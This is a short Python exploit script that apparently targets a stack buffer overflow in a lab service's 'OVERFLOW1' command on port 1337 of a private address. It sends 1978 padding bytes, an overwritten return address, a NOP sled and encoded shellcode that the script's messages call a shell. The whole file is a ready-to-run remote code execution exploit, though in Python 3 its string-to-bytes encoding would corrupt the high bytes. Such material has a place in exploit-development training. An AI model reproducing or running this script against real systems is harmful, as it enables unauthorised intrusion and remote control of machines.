#!/bin/python
# exploit.py

import sys
import socket
import time

def conn():
    print("starting exploit")

    try:
        payload = (
"\xd9\xe8\xbb\x45\x6b\xca\xa8\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x58\x17\x03\x58\x17\x83\xad\x97\x28\x5d\xd1\x80\x2f"
"\x9e\x29\x51\x50\x16\xcc\x60\x50\x4c\x85\xd3\x60\x06\xcb\xdf"
"\x0b\x4a\xff\x54\x79\x43\xf0\xdd\x34\xb5\x3f\xdd\x65\x85\x5e"
"\x5d\x74\xda\x80\x5c\xb7\x2f\xc1\x99\xaa\xc2\x93\x72\xa0\x71"
"\x03\xf6\xfc\x49\xa8\x44\x10\xca\x4d\x1c\x13\xfb\xc0\x16\x4a"
"\xdb\xe3\xfb\xe6\x52\xfb\x18\xc2\x2d\x70\xea\xb8\xaf\x50\x22"
"\x40\x03\x9d\x8a\xb3\x5d\xda\x2d\x2c\x28\x12\x4e\xd1\x2b\xe1"
"\x2c\x0d\xb9\xf1\x97\xc6\x19\xdd\x26\x0a\xff\x96\x25\xe7\x8b"
"\xf0\x29\xf6\x58\x8b\x56\x73\x5f\x5b\xdf\xc7\x44\x7f\xbb\x9c"
"\xe5\x26\x61\x72\x19\x38\xca\x2b\xbf\x33\xe7\x38\xb2\x1e\x60"
"\x8c\xff\xa0\x70\x9a\x88\xd3\x42\x05\x23\x7b\xef\xce\xed\x7c"
"\x10\xe5\x4a\x12\xef\x06\xab\x3b\x34\x52\xfb\x53\x9d\xdb\x90"
"\xa3\x22\x0e\x36\xf3\x8c\xe1\xf7\xa3\x6c\x52\x90\xa9\x62\x8d"
"\x80\xd2\xa8\xa6\x2b\x29\x3b\x09\x03\x83\xf8\xe1\x56\xe3\xef"
"\x26\xdf\x05\x65\xd9\xb6\x9e\x12\x40\x93\x54\x82\x8d\x09\x11"
"\x84\x06\xbe\xe6\x4b\xef\xcb\xf4\x3c\x1f\x86\xa6\xeb\x20\x3c"
"\xce\x70\xb2\xdb\x0e\xfe\xaf\x73\x59\x57\x01\x8a\x0f\x45\x38"
"\x24\x2d\x94\xdc\x0f\xf5\x43\x1d\x91\xf4\x06\x19\xb5\xe6\xde"
"\xa2\xf1\x52\x8f\xf4\xaf\x0c\x69\xaf\x01\xe6\x23\x1c\xc8\x6e"
"\xb5\x6e\xcb\xe8\xba\xba\xbd\x14\x0a\x13\xf8\x2b\xa3\xf3\x0c"
"\x54\xd9\x63\xf2\x8f\x59\x93\xb9\x8d\xc8\x3c\x64\x44\x49\x21"
"\x97\xb3\x8e\x5c\x14\x31\x6f\x9b\x04\x30\x6a\xe7\x82\xa9\x06"
"\x78\x67\xcd\xb5\x79\xa2")
        exploit = "A" * 1978 + "\xaf\x11\x50\x62" + "\x90" * 10 + payload 
        print("connecting to server ...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.178.164", 1337))
        s.recv(1024)
        print ("sending payload")
        # s.send("OVERFLOW1" + string + "\r\n")
        payload = ("OVERFLOW1 " + exploit + "\r\n")
        s.send(payload.encode())
        s.recv(1024)
        print("receiving shell")
        s.close()
        print("closing")
        time.sleep(0.5)
    except Exception as e:
        print("Error: %s " %e)
        s.close()
        sys.exit()
    except KeyboardInterrupt:
        sys.exit("^C")

conn()